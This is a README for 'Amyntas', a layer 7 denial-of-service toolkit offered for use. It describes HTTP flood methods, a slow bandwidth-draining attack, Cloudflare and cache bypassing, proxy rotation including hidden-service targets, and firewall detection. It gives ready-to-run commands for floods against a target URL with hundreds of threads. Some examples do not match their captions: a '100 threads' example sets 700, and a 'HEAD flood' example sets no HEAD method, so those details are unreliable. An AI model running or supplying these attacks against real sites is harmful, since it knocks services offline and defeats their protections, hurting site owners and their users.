## NOTE!
Results may vary A LOT when attacking! <br>
It might peak at 40k rq/s and drop down to 2k rq/s or peak at 169 requests per second, just so you know! <bn>
The webdrivers used for the <strong>Browser Emulation</strong> attack are Windows 64 bit executables, replace them if you need to!!

--- 

### About
Amyntas is a layer 7 DoS toolkit, with a wide variety of attack methods and the capability to bypass caching systems. <br>
Use at your own risk! I, the author, am not responsible for any harm you do! Keep that in mind!

<br>

Aviable methods
- GET (simple GET flood)
- HEAD (simple HEAD flood)
- POST (simple POST flood)
- FAST (a <strong>GET /</strong> flood)
- GHP/GETHEADPOST (a flood which randomly chooses GET, HEAD or POST as request method)
- LEECH (a low & slow HTTP GET flood which can drain A LOT of bandwith)
- MIX (a method which randomly chooses HTTP request methods)
- BYPASS (bypasses cloudflare)

---

### Features
1. IPv6 support
2. Cache bypassing mechanisms
3. Random headers (user agents, referers)
4. Real time "worker" system
5. Supports custom user-agent and referer
6. Proxy support (Rotating proxies coming soon)

---

### Known bugs/problems
1. Attack does not end when you want it to end

---

### To Do list
1. More methods
2. More documentation

---

### Usage
All options:
```
-h, --help                             Show this help message and exit
-t TARGET, --target TARGET             Target URL (Example: https://google.com or http://pornhub.com)
-p PORT, --port PORT                   Target port (Leave empty to let the tool decide)
-d DURATION, --duration DURATION       Attack duration
--proxy-file FILE_PATH                 Path to proxies
--proxy PROXY                          Use a proxy when attacking (Example: 127.0.0.1:1337)
--proxy-type PROXY_TYPE                Set the proxy type (HTTP, SOCKS4 or SOCKS5)
--proxy-user PROXY_USER                Proxy username
--proxy-pass PROXY_PASS                Proxy password
--proxy-resolve                        Resolve host using proxy (needed for hidden service targets)
-ua USERAGENT, --user-agent USERAGENT  User agent to use when attacking, else its dynamic
-ref REFERER, --referer REFERER        Referer to use when attacking, else its dynamic
-w WORKERS, --workers WORKERS          Amount of workers/threads to use when attacking
-dbg, --debug                          Print info for devs
-bc, --bypass-cache                    Bypass the cache of the site
-m METHOD, --method METHOD             Method to use when attacking (default: GET)
-dfw, --detect-firewall                Detect if the target site is protected by a firewall
```

Basic usage:
```
python3 amyntas.py -t https://target.com
```

GET flood, attacking with 100 threads for 1337 seconds:
```
python3 amyntas.py -t https://target.com -w 700 -d 1337
```

POST flood, attacking with 700 threads for 40 seconds:
```
python3 amyntas.py -t https://target.com -w 700 -m POST -d 40
```

Proxified HEAD flood using a file with SOCKS5 proxies, with 1337 threads for 40 seconds
```
python3 amyntas.py --proxy-file socks5.txt --proxy-type SOCKS5 -t https://target.com -w 1337 -d 40
```

---

### Requirements

```
requests
argparse
colorama
netaddr
cloudscraper
selenium
undetected_chromedriver
```